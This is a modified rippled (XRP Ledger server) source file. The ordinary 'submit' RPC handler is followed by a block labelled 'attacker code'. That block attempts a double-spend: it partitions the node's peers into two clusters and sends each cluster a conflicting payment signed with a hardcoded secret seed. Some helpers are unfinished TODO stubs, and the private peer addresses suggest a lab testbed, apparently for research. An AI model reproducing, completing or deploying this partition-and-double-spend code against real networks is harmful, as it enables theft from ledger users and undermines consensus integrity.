//------------------------------------------------------------------------------
/*
    This file is part of rippled: https://github.com/ripple/rippled
    Copyright (c) 2012-2014 Ripple Labs Inc.

    Permission to use, copy, modify, and/or distribute this software for any
    purpose  with  or without fee is hereby granted, provided that the above
    copyright notice and this permission notice appear in all copies.

    THE  SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
    WITH  REGARD  TO  THIS  SOFTWARE  INCLUDING  ALL  IMPLIED  WARRANTIES  OF
    MERCHANTABILITY  AND  FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
    ANY  SPECIAL ,  DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
    WHATSOEVER  RESULTING  FROM  LOSS  OF USE, DATA OR PROFITS, WHETHER IN AN
    ACTION  OF  CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
    OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
//==============================================================================

#include <chrono>
#include <thread>

#include <ripple/app/ledger/LedgerMaster.h>
#include <ripple/app/misc/NetworkOPs.h>
#include <ripple/app/misc/HashRouter.h>
#include <ripple/app/misc/Transaction.h>
#include <ripple/app/misc/ValidatorList.h>
#include <ripple/app/tx/apply.h>
#include <ripple/net/RPCErr.h>
#include <ripple/protocol/ErrorCodes.h>
#include <ripple/resource/Fees.h>
#include <ripple/rpc/Role.h>
#include <ripple/rpc/Context.h>
#include <ripple/rpc/impl/TransactionSign.h>
#include <ripple/overlay/impl/PeerImp.h>
#include <ripple/overlay/impl/OverlayImpl.h>
#include <ripple/ledger/ApplyView.h>

namespace ripple {

static NetworkOPs::FailHard getFailHard (RPC::Context const& context)
{
    return NetworkOPs::doFailHard (
        context.params.isMember ("fail_hard")
        && context.params["fail_hard"].asBool ());
}

// {
//   tx_json: <object>,
//   secret: <secret>
// }
Json::Value doSubmit (RPC::Context& context)
{
    context.loadType = Resource::feeMediumBurdenRPC;

    if (!context.params.isMember (jss::tx_blob))
    {
        auto const failType = getFailHard (context);

        if (context.role != Role::ADMIN && !context.app.config().canSign())
            return RPC::make_error (rpcNOT_SUPPORTED,
                "Signing is not supported by this server.");

        auto ret = RPC::transactionSubmit (
            context.params, failType, context.role,
            context.ledgerMaster.getValidatedLedgerAge(),
            context.app, RPC::getProcessTxnFn (context.netOps));

        ret[jss::deprecated] = "Signing support in the 'submit' command has been "
                               "deprecated and will be removed in a future version "
                               "of the server. Please migrate to a standalone "
                               "signing tool.";

        return ret;
    }

    Json::Value jvResult;

    auto ret = strUnHex (context.params[jss::tx_blob].asString ());

    if (!ret || !ret->size ())
        return rpcError (rpcINVALID_PARAMS);

    SerialIter sitTrans (makeSlice(*ret));

    std::shared_ptr<STTx const> stpTrans;

    try
    {
        stpTrans = std::make_shared<STTx const> (std::ref (sitTrans));
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]        = "invalidTransaction";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    {
        if (!context.app.checkSigs())
            forceValidity(context.app.getHashRouter(),
                stpTrans->getTransactionID(), Validity::SigGoodOnly);
        auto [validity, reason] = checkValidity(context.app.getHashRouter(),
            *stpTrans, context.ledgerMaster.getCurrentLedger()->rules(),
                context.app.config());
        if (validity != Validity::Valid)
        {
            jvResult[jss::error] = "invalidTransaction";
            jvResult[jss::error_exception] = "fails local checks: " + reason;

            return jvResult;
        }
    }

    std::string reason;
    auto tpTrans = std::make_shared<Transaction> (
        stpTrans, reason, context.app);
    if (tpTrans->getStatus() != NEW)
    {
        jvResult[jss::error]            = "invalidTransaction";
        jvResult[jss::error_exception] = "fails local checks: " + reason;

        return jvResult;
    }

    try
    {
        auto const failType = getFailHard (context);

        context.netOps.processTransaction (
            tpTrans, isUnlimited (context.role), true, failType);
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalSubmit";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    try
    {
        jvResult[jss::tx_json] = tpTrans->getJson (JsonOptions::none);
        jvResult[jss::tx_blob] = strHex (
            tpTrans->getSTransaction ()->getSerializer ().peekData ());

        if (temUNCERTAIN != tpTrans->getResult ())
        {
            std::string sToken;
            std::string sHuman;

            transResultInfo (tpTrans->getResult (), sToken, sHuman);

            jvResult[jss::engine_result]           = sToken;
            jvResult[jss::engine_result_code]      = tpTrans->getResult ();
            jvResult[jss::engine_result_message]   = sHuman;
        }

        return jvResult;
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalJson";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }
}

// Start attacker code
Json::Value doAttack (RPC::Context& context)
{
    auto j = context.app.journal ("Attack");
    JLOG (j.warn()) << "Starting doAttack";
    
    context.loadType = Resource::feeMediumBurdenRPC;
    const auto active_peers = context.app.overlay ().getActivePeers();
    auto const failType = getFailHard (context);
    context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";

    // create tx and import into context.params['tx_json']:
    Json::Value tx;
    tx[jss::Account] = "rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN";
    tx[jss::Amount] = "1000000000";
    tx[jss::Destination] = "rG1eMisac1neCXeZNPYmwV8sovo5vs9dnB";
    tx[jss::Fee] = "10";
    tx[jss::TransactionType] = "Payment";
    context.params[jss::tx_json] = tx;

    // Change peers to match only network-cluster 1
    changePeers(context, active_peers, 1, j);
    // Add tx to Transaction Queue (TxQ) and view ?
    RPC::transactionSubmitAttack (
        context.params, failType, context.role,
        context.ledgerMaster.getValidatedLedgerAge(),
        context.app, RPC::getProcessTxnFnAttack (context.netOps));

    // Send all queued transactions
    sendQueuedTransactions(context, j);     // TODO
    
    // Remove all transactions from TxQ / view ?
    // clearTxQ();        // TODO
    
    // Change destination of tx -> this tx should be conflicting
    tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
    context.params[jss::tx_json] = tx;

    // Change peers to match only network-cluster 2
    changePeers(context, active_peers, 2, j);
    // Add tx to Transaction Queue (TxQ) and view ?
    RPC::transactionSubmitAttack (
        context.params, failType, context.role,
        context.ledgerMaster.getValidatedLedgerAge(),
        context.app, RPC::getProcessTxnFnAttack (context.netOps));
    
    // Send all queued transactions
    sendQueuedTransactions(context, j);     // TODO

    // Only connect to peers in cluster 1 (for debugging)
    changePeers(context, active_peers, 1, j);
    return Json::Value();
}

void sendQueuedTransactions(RPC::Context& context, beast::Journal j) {
    // TODO: implement this function
    // For now: just print all peers we are connected to:
    auto peers = context.app.overlay ().getActivePeers();
    for (auto& peer : peers) {
        auto peer_endpoint = peer->getRemoteAddress();
        std::string addressString = peer_endpoint.address().to_string();
        JLOG (j.warn()) << "sendQueuedTransactions: connected to " << addressString;
    }
    return;
}

void changePeers (RPC::Context& context, Overlay::PeerSequence peers, int cluster_idx, beast::Journal j) {
    JLOG (j.warn()) << "changePeers: start (cluster_idx: " << cluster_idx << ")";
    
    // Iter over all peers and either connect or disconnect from peers
    for (auto& peer : peers) {
        if (peer) {
            auto peer_endpoint = peer->getRemoteAddress();
            std::string addressString = peer_endpoint.address().to_string();

            if (shouldConnectPeer(addressString, cluster_idx)) {
                JLOG (j.warn()) << "changePeers: connect    to   " << addressString;
                context.app.overlay ().connect(peer_endpoint);
            } else {
                JLOG (j.warn()) << "changePeers: disconnect from " << addressString;
                auto peerImp = std::dynamic_pointer_cast<PeerImp>(peer);
                peerImp->close();
            }
        }
    }
}

bool shouldConnectPeer(std::string peer_address, int cluster_idx) {
    bool is_node1 = (strcmp(peer_address.c_str(), "10.5.1.1") == 0);  // in cluster 1
    bool is_node2 = (strcmp(peer_address.c_str(), "10.5.1.2") == 0);  // in cluster 1
    bool is_node3 = (strcmp(peer_address.c_str(), "10.5.1.3") == 0);  // in cluster 1
    bool is_node4 = (strcmp(peer_address.c_str(), "10.5.1.4") == 0);  // in cluster 2
    bool is_node5 = (strcmp(peer_address.c_str(), "10.5.1.5") == 0);  // in cluster 2
    bool is_node6 = (strcmp(peer_address.c_str(), "10.5.1.6") == 0);  // in cluster 2

    if (cluster_idx == 0) {         // connect to all
        return true;
    }
    else if (cluster_idx == 1) {    // connect to network-cluster 1
        return (is_node1 || is_node2 || is_node3);
    }
    else if (cluster_idx == 2) {    // connect to network-cluster 2
        return (is_node4 || is_node5 || is_node6);
    } else {                        // connect to no nodes
        return false;
    }
}

void clearTxQ(RPC::Context& context, beast::Journal j) {    // TODO
    auto& txQ = context.app.getTxQ();
    // auto& view = context.app.getView();
}
// End attacker code

} // ripple
